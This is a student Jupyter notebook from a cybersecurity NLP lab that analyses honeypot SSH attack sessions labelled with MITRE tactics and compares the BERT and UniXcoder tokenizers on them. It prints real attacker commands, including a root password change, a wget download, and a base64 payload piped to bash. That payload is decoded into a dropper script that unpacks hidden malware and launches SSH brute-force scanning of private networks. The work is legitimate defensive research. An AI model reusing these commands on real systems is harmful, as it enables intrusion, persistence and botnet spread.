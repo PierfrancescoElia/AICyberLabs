{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "i_AVzWfvLVZt"
   },
   "source": [
    "# Project 3: Natural Language Processing (NLP)\n",
    "\n",
    "| Member | ID |\n",
    "| -- | -- |\n",
    "| Alessandro Meneghini| s332228 |\n",
    "| Pierfrancesco Elia | s331497 |\n",
    "| Ankesh Porwal | s328746 |\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "7DHgjB2eNIls"
   },
   "source": [
    "## Task 1: Dataset Characterization"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "id": "T013p6gaNEEJ"
   },
   "outputs": [],
   "source": [
    "from itertools import chain\n",
    "from copy import deepcopy\n",
    "from collections import Counter,defaultdict\n",
    "\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import json\n",
    "import matplotlib.pyplot as plt\n",
    "import matplotlib.colors as mcolors\n",
    "from matplotlib.colors import LinearSegmentedColormap\n",
    "from matplotlib.ticker import ScalarFormatter\n",
    "from tqdm.auto import tqdm\n",
    "import base64\n",
    "\n",
    "\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import accuracy_score\n",
    "from sklearn.metrics import classification_report\n",
    "from sklearn.metrics import f1_score\n",
    "from sklearn.metrics import precision_score\n",
    "from sklearn.metrics import recall_score\n",
    "from sklearn.linear_model import LinearRegression\n",
    "\n",
    "import torch\n",
    "from torch.utils.data import DataLoader\n",
    "from torch.optim import AdamW\n",
    "\n",
    "from datasets import Dataset\n",
    "from datasets import DatasetDict\n",
    "\n",
    "from transformers import AutoModelForTokenClassification\n",
    "from transformers import AutoConfig\n",
    "from transformers import DataCollatorForTokenClassification\n",
    "from transformers import get_scheduler\n",
    "from transformers import AutoTokenizer\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "id": "O-nMcB68NJzJ"
   },
   "outputs": [],
   "source": [
    "np.random.seed(42)\n",
    "\n",
    "train_url = 'https://raw.githubusercontent.com/PierfrancescoElia/AICyberLabs/refs/heads/main/Lab03/train.json'\n",
    "test_url = 'https://raw.githubusercontent.com/PierfrancescoElia/AICyberLabs/refs/heads/main/Lab03/test.json'\n",
    "train_data = pd.read_json(train_url)\n",
    "test_data = pd.read_json(test_url)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 206
    },
    "id": "83bG3-Zj3CmQ",
    "outputId": "32e20bd9-3530-458a-89fd-6ef00c8e428f"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
       "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
       "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>cd /tmp || cd /var/run || cd /mnt || cd /root ...</td>\n",
       "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...</td>\n",
       "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>cat /var/tmp/.systemcache436621 ; echo 1 &gt; /va...</td>\n",
       "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             session  \\\n",
       "0  rm -rf /var/run/1sh ; wget -c http://71.127.14...   \n",
       "1  cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
       "2  cd /tmp || cd /var/run || cd /mnt || cd /root ...   \n",
       "3  ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...   \n",
       "4  cat /var/tmp/.systemcache436621 ; echo 1 > /va...   \n",
       "\n",
       "                                               label  \n",
       "0  [Execution, Execution, Execution, Execution, E...  \n",
       "1  [Discovery, Discovery, Discovery, Discovery, D...  \n",
       "2  [Execution, Execution, Execution, Execution, E...  \n",
       "3  [Discovery, Discovery, Discovery, Discovery, D...  \n",
       "4  [Discovery, Discovery, Discovery, Discovery, D...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(train_data.head())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "Rguh55ta3CmV"
   },
   "source": [
    "### Exploring the Label Distribution\n",
    "\n",
    "- The dataset contains **7 unique MITRE tactic tags**.\n",
    "- Most common tag: **Discovery** .\n",
    "- Least common tag: **Impact** .\n",
    "- The tag distribution is similar between train and test sets, but the dataset is imbalanced, with some tactics much more frequent than others.\n",
    "\n",
    "*See the barplot below for the full distribution across both splits.*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 462
    },
    "id": "DLWDSvnv3CmX",
    "outputId": "51db787a-e0d8-43e4-d053-13a49368b89a"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unique tag values are 7\n",
      "{'Discovery', 'Impact', 'Other', 'Execution', 'Not Malicious Yet', 'Defense Evasion', 'Persistence'}\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "train_labels = []\n",
    "test_labels = []\n",
    "for l in train_data['label']:\n",
    "    train_labels.extend(l)\n",
    "\n",
    "for l in test_data['label']:\n",
    "    test_labels.extend(l)\n",
    "print(f\"Unique tag values are {len(set(train_labels + test_labels))}\")\n",
    "print(set(train_labels + test_labels))\n",
    "print()\n",
    "\n",
    "\n",
    "fig, axs = plt.subplots(1, 1, figsize=(10, 4))\n",
    "\n",
    "train_tag_counts = pd.Series(train_labels).value_counts().sort_index()\n",
    "test_tag_counts = pd.Series(test_labels).value_counts().sort_index()\n",
    "tag_names = sorted(list(set(train_labels + test_labels)))\n",
    "\n",
    "bar_width = 0.35\n",
    "x = np.arange(len(tag_names))\n",
    "axs.bar(x - bar_width/2, [train_tag_counts.get(tag, 0) for tag in tag_names], width=bar_width, label='Train', color='skyblue')\n",
    "axs.bar(x + bar_width/2, [test_tag_counts.get(tag, 0) for tag in tag_names], width=bar_width, label='Test', color='orange')\n",
    "axs.set_xticks(x)\n",
    "axs.set_xticklabels(tag_names, rotation=30, ha='right')\n",
    "axs.set_title(\"Distribution of MITRE Tactic Tags\")\n",
    "axs.set_ylabel(\"Word Count\")\n",
    "axs.legend()\n",
    "\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "PeGRd7Fw3CmY"
   },
   "source": [
    "### Analysis of the `echo` Command Labels\n",
    "\n",
    "- **Number of different tags assigned to `echo`:** 6  \n",
    "- **Occurrences:**  \n",
    "  - Persistence: 104  \n",
    "  - Execution: 39  \n",
    "  - Discovery: 31  \n",
    "  - Not Malicious Yet: 8  \n",
    "  - Impact: 6  \n",
    "  - Other: 4  \n",
    "\n",
    "*Examples for `Persistence` and `Execution` are shown in the output below.*\n",
    "\n",
    "- The `echo` labeled as **Persistence** is changing the root password, a classic method for maintaining access to a system.\n",
    "- The `echo` labeled as **Execution** is used to pipe a base64-encoded command into bash (`| base64 --decode | bash`), directly executing a new payload.\n",
    "\n",
    "The context of how `echo` is used determines its label.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 629
    },
    "id": "fZNtuibX3CmZ",
    "outputId": "c532a787-d28a-4af4-ca31-590cafaa8738"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Echo stats: Counter({'Persistence': 104, 'Execution': 39, 'Discovery': 31, 'Not Malicious Yet': 8, 'Impact': 6, 'Other': 4})\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 700x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found echo session with Persistence and Execution tags:\n",
      " cat /proc/cpuinfo | grep name | wc -l ; echo root:JrBOFLr9oFxB | chpasswd | bash ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw | base64 --decode | bash ;\n",
      "\n",
      "context of echo with Persistence tag:\n",
      "\t echo root:JrBOFLr9oFxB | chpasswd |\n",
      "\t echo 321 > /var/tmp/.var03522123 ;\n",
      "\n",
      "context of echo with Execution tag:\n",
      "\t echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s\n",
      "\t echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw | base64 --decode | bash ;\n"
     ]
    }
   ],
   "source": [
    "echo_stats = Counter()\n",
    "for words, labels in zip(train_data['session'].str.split(\" \"),train_data['label']):\n",
    "    for word, label in zip(words, labels):\n",
    "        if word == 'echo':\n",
    "            echo_stats[label] += 1\n",
    "print(\"Echo stats:\", echo_stats)\n",
    "\n",
    "plt.figure(figsize=(7,4))\n",
    "plt.bar(echo_stats.keys(), echo_stats.values(), color='skyblue')\n",
    "plt.xlabel(\"MITRE Tactic Tag\")\n",
    "plt.ylabel(\"Count of 'echo'\")\n",
    "plt.title(\"Distribution of 'echo' Command by Tag\")\n",
    "plt.xticks(rotation=30, ha='right')\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "found = 0\n",
    "echo_session = None\n",
    "\n",
    "for words, labels in zip(train_data['session'].str.split(\" \"),train_data['label']):\n",
    "    echo_tags = {label for word, label in zip(words, labels) if word == 'echo'}\n",
    "    if 'Persistence' in echo_tags and 'Execution' in labels:\n",
    "        echo_session = (words, labels)\n",
    "        break\n",
    "\n",
    "print(\"Found echo session with Persistence and Execution tags:\\n\", *[i for i in echo_session[0]])\n",
    "print()\n",
    "\n",
    "print(\"context of echo with Persistence tag:\")\n",
    "for j,(word, label) in enumerate(zip(*echo_session)):\n",
    "    if word == 'echo' and label == 'Persistence':\n",
    "        print(\"\\t\", *[i for i in echo_session[0][j:j+5]])\n",
    "print()\n",
    "\n",
    "print(\"context of echo with Execution tag:\")\n",
    "for j,(word, label) in enumerate(zip(*echo_session)):\n",
    "    if word == 'echo' and label == 'Execution':\n",
    "        print(\"\\t\",*[i for i in echo_session[0][j:j+10]])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "6Niu7nl13Cma",
    "outputId": "ca44ab83-8f01-4e62-9963-0376efb02e2a"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Base64 encoded bash script extracted from echo commands with Execution tags:\n",
      "\n",
      "#!/bin/bash\n",
      "cd /tmp\t\n",
      "rm -rf .ssh\n",
      "rm -rf .mountfs\n",
      "rm -rf .X13-unix\n",
      "mkdir .X13-unix\n",
      "cd .X13-unix\n",
      "mv /var/tmp/dota.tar.gz dota.tar.gz\n",
      "tar xf dota.tar.gz\n",
      "sleep 3s && cd /tmp/.X13-unix/.rsync/c\n",
      "nohup /tmp/.X13-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&\n",
      "sleep 8m; nohup /tmp/.X13-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&\n",
      "sleep 20m && cd /tmp/.X13-unix/ && cat /tmp/.X13-unix/.rsync/initall | bash 2>1&\n",
      "exit 0\n"
     ]
    }
   ],
   "source": [
    "print(\"Base64 encoded bash script extracted from echo commands with Execution tags:\\n\")\n",
    "b64string = 'IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw'\n",
    "print(base64.b64decode(b64string).decode('utf-8'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "jf_VU2Y63Cmb"
   },
   "source": [
    "### Session Length Analysis (ECDF)\n",
    "\n",
    "The ECDF plot below shows the distribution of Bash words per session for both train and test sets.\n",
    "\n",
    "- **Median session length:** 17 Bash words (train), 23.5 Bash words (test)\n",
    "- **Mean session length:** 45.7 (train), 57.4 (test)\n",
    "- **90th percentile:** 147 (train), 166.4 (test)\n",
    "- **Maximum:** 224 Bash words (both train and test)\n",
    "\n",
    "Most sessions contain far fewer than 100 Bash words, but a few sessions are much longer. The distributions are similar between train and test, as shown in the ECDF plot above.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 784
    },
    "id": "bgaVB85A3Cmb",
    "outputId": "30e39598-6d43-404d-ed0e-efe8e6eb57b1"
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Train session length stats:\n",
      "Median: 17.0\n",
      "Mean: 45.71713147410359\n",
      "90th percentile: 147.0\n",
      "Max: 224\n",
      "\n",
      "Test session length stats:\n",
      "Median: 23.5\n",
      "Mean: 57.379629629629626\n",
      "90th percentile: 166.39999999999995\n",
      "Max: 224\n"
     ]
    }
   ],
   "source": [
    "train_lengths = train_data['session'].str.split(\" \").apply(len)\n",
    "test_lengths = test_data['session'].str.split(\" \").apply(len)\n",
    "\n",
    "# ECDF Plot\n",
    "plt.figure(figsize=(10, 6))\n",
    "x_train = np.sort(train_lengths)\n",
    "y_train = np.arange(1, len(x_train) + 1) / len(x_train)\n",
    "x_test = np.sort(test_lengths)\n",
    "y_test = np.arange(1, len(x_test) + 1) / len(x_test)\n",
    "plt.plot(x_train, y_train, \".-\", label=\"Train\")\n",
    "plt.plot(x_test, y_test, \".-\", label=\"Test\")\n",
    "\n",
    "plt.xlabel(\"Bash Words per Session\")\n",
    "plt.ylabel(\"ECDF\")\n",
    "plt.title(\"ECDF of Session Lengths\")\n",
    "plt.legend()\n",
    "plt.grid()\n",
    "plt.show()\n",
    "\n",
    "print()\n",
    "print(\"Train session length stats:\")\n",
    "print(\"Median:\", train_lengths.median())\n",
    "print(\"Mean:\", train_lengths.mean())\n",
    "print(\"90th percentile:\", np.percentile(train_lengths, 90))\n",
    "print(\"Max:\", train_lengths.max())\n",
    "print()\n",
    "print(\"Test session length stats:\")\n",
    "print(\"Median:\", test_lengths.median())\n",
    "print(\"Mean:\", test_lengths.mean())\n",
    "print(\"90th percentile:\", np.percentile(test_lengths, 90))\n",
    "print(\"Max:\", test_lengths.max())\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "lC3K9QOI3Cmd"
   },
   "source": [
    "## Task 2: Tokenization\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "0_YDau8OaphH"
   },
   "source": [
    "### Tokenization of SSH Commands\n",
    "\n",
    "UniXcoder generally has a better (lower) ratio, meaning fewer tokens per command on average.\n",
    "\n",
    "- **BERT:**\n",
    "  - Out of 9 commands, 4 (`cat`, `shell`, `echo`, `top`) are recognized as a single token.\n",
    "  - The other 5 are split: `chpasswd` and `crontab` into 3 tokens, `wget`, `busybox`, and `grep` into 2 tokens.\n",
    "\n",
    "- **UniXcoder:**\n",
    "  - 6 commands (`cat`, `shell`, `echo`, `top`, `busybox`, `grep`) are single tokens.\n",
    "  - `chpasswd` is split into 2 tokens.\n",
    "  - `crontab` and `wget` are split into 3 and 2 tokens respectively.\n",
    "\n",
    "BERT and UniXcoder both split compound commands, but UniXcoder recognizes more commands as single tokens (6 out of 9), likely due to its pre-training on code and shell data. BERT only treats 4 out of 9 as a single token.  \n",
    "Commands like `top`, `cat`, and `shell` are common words in the English dictionary, so it is expected that both tokenizers keep them as whole tokens.\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 462
    },
    "id": "wyQGXKFN3Cmd",
    "outputId": "c30391a0-b188-4704-df88-2c88dde16367"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Command</th>\n",
       "      <th>BERT tokens</th>\n",
       "      <th>Num BERT tokens</th>\n",
       "      <th>UniXcoder tokens</th>\n",
       "      <th>Num UniXcoder tokens</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>cat</td>\n",
       "      <td>[cat]</td>\n",
       "      <td>1</td>\n",
       "      <td>[cat]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>shell</td>\n",
       "      <td>[shell]</td>\n",
       "      <td>1</td>\n",
       "      <td>[shell]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>echo</td>\n",
       "      <td>[echo]</td>\n",
       "      <td>1</td>\n",
       "      <td>[echo]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>top</td>\n",
       "      <td>[top]</td>\n",
       "      <td>1</td>\n",
       "      <td>[top]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>chpasswd</td>\n",
       "      <td>[ch, ##pass, ##wd]</td>\n",
       "      <td>3</td>\n",
       "      <td>[ch, passwd]</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>crontab</td>\n",
       "      <td>[cr, ##ont, ##ab]</td>\n",
       "      <td>3</td>\n",
       "      <td>[cr, ont, ab]</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>wget</td>\n",
       "      <td>[w, ##get]</td>\n",
       "      <td>2</td>\n",
       "      <td>[w, get]</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>busybox</td>\n",
       "      <td>[busy, ##box]</td>\n",
       "      <td>2</td>\n",
       "      <td>[busybox]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>grep</td>\n",
       "      <td>[gr, ##ep]</td>\n",
       "      <td>2</td>\n",
       "      <td>[grep]</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Command         BERT tokens  Num BERT tokens UniXcoder tokens  \\\n",
       "0       cat               [cat]                1            [cat]   \n",
       "1     shell             [shell]                1          [shell]   \n",
       "2      echo              [echo]                1           [echo]   \n",
       "3       top               [top]                1            [top]   \n",
       "4  chpasswd  [ch, ##pass, ##wd]                3     [ch, passwd]   \n",
       "5   crontab   [cr, ##ont, ##ab]                3    [cr, ont, ab]   \n",
       "6      wget          [w, ##get]                2         [w, get]   \n",
       "7   busybox       [busy, ##box]                2        [busybox]   \n",
       "8      grep          [gr, ##ep]                2           [grep]   \n",
       "\n",
       "   Num UniXcoder tokens  \n",
       "0                     1  \n",
       "1                     1  \n",
       "2                     1  \n",
       "3                     1  \n",
       "4                     2  \n",
       "5                     3  \n",
       "6                     2  \n",
       "7                     1  \n",
       "8                     1  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "bert_tokenizer = AutoTokenizer.from_pretrained(\"bert-base-uncased\")\n",
    "unix_tokenizer = AutoTokenizer.from_pretrained(\"microsoft/unixcoder-base\")\n",
    "\n",
    "commands = ['cat', 'shell', 'echo', 'top', 'chpasswd', 'crontab', 'wget', 'busybox', 'grep']\n",
    "\n",
    "table_data = []\n",
    "for cmd in commands:\n",
    "    bert_toks = bert_tokenizer.tokenize(cmd)\n",
    "    unix_toks = unix_tokenizer.tokenize(cmd)\n",
    "    table_data.append({\n",
    "        'Command': cmd,\n",
    "        'BERT tokens': bert_toks,\n",
    "        'Num BERT tokens': len(bert_toks),\n",
    "        'UniXcoder tokens': unix_toks,\n",
    "        'Num UniXcoder tokens': len(unix_toks)\n",
    "    })\n",
    "\n",
    "df = pd.DataFrame(table_data)\n",
    "display(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "aXzXnZieceUQ"
   },
   "source": [
    "### Tokenization Statistics on the Training and Test Corpus\n",
    "\n",
    "- **BERT:**\n",
    "  - Average tokens per session: **176.6**\n",
    "  - Median: **69**\n",
    "  - Maximum: **1887**\n",
    "- **UniXcoder:**\n",
    "  - Average tokens per session: **407.3**\n",
    "  - Median: **60**\n",
    "  - Maximum: **28918**\n",
    "\n",
    "UniXcoder produces more tokens on average and has a much higher maximum. This is because UniXcoder never uses `[UNK]` tokens and splits every unknown or rare word into multiple sub-tokens, especially for very long or complex Bash words.\n",
    "BERT instead sometimes uses a single `[UNK]` token for unknown words, resulting in fewer total tokens in such cases."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "1nMCjrC7c92a",
    "outputId": "04fe71e1-b281-45a4-b67b-6e154fba90f6"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Token indices sequence length is longer than the specified maximum sequence length for this model (1887 > 512). Running this sequence through the model will result in indexing errors\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "BERT Tokenization Statistics:\n",
      "  Count: 251\n",
      "  Mean: 176.6\n",
      "  Std: 314.8\n",
      "  Min: 2\n",
      "  25%: 25\n",
      "  Median: 69\n",
      "  75%: 165\n",
      "  Max: 1887\n",
      "\n",
      "UniXcoder Tokenization Statistics:\n",
      "  Count: 251\n",
      "  Mean: 407.3\n",
      "  Std: 2579.1\n",
      "  Min: 2\n",
      "  25%: 22\n",
      "  Median: 60\n",
      "  75%: 148\n",
      "  Max: 28918\n",
      "\n",
      "Top 10 Longest UniXcoder Tokenized Sessions:\n",
      "  Index:  14 | Tokens: 28918\n",
      "  Index: 191 | Tokens: 28918\n",
      "  Index:  37 | Tokens: 1740\n",
      "  Index: 193 | Tokens: 1731\n",
      "  Index: 190 | Tokens: 1722\n",
      "  Index:  31 | Tokens: 1722\n",
      "  Index: 199 | Tokens: 1713\n",
      "  Index: 113 | Tokens: 1179\n",
      "  Index:  74 | Tokens: 999\n",
      "  Index: 249 | Tokens: 967\n",
      "\n",
      "Top 10 Longest BERT Tokenized Sessions:\n",
      "  Index:  14 | Tokens: 1887\n",
      "  Index: 191 | Tokens: 1886\n",
      "  Index: 193 | Tokens: 1691\n",
      "  Index:  37 | Tokens: 1682\n",
      "  Index: 190 | Tokens: 1682\n",
      "  Index:  31 | Tokens: 1673\n",
      "  Index: 199 | Tokens: 1655\n",
      "  Index: 113 | Tokens: 1189\n",
      "  Index: 237 | Tokens: 635\n",
      "  Index:  74 | Tokens: 631\n",
      "\n",
      "Example session details for the longest UniXcoder tokenized session:\n",
      "Session Index: 14\n",
      "Original Bash word count: 134\n",
